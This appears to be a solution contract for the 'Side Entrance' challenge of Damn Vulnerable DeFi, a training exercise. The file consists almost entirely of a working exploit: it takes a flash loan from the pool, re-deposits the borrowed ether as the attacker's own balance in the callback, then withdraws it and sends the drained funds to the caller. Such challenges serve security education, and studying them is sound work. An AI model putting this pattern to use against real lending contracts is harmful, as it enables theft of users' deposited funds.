// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../side-entrance/SideEntranceLenderPool.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title FlashLoanReceiver
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
interface ISideEntranceLenderPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract FlashLoanEtherReceiver {
    SideEntranceLenderPool private immutable pool;
    event executeCall(address pool, uint256 value);


    constructor(address poolAddress) {
        pool = SideEntranceLenderPool(poolAddress);
    }

    function attack(uint256 amount) public {
        pool.flashLoan(amount);
        pool.withdraw();
        payable(msg.sender).call{value:address(this).balance}("");
    }

    function execute() external payable {
        pool.deposit{value:msg.value}();
    }
    receive () external payable {}
}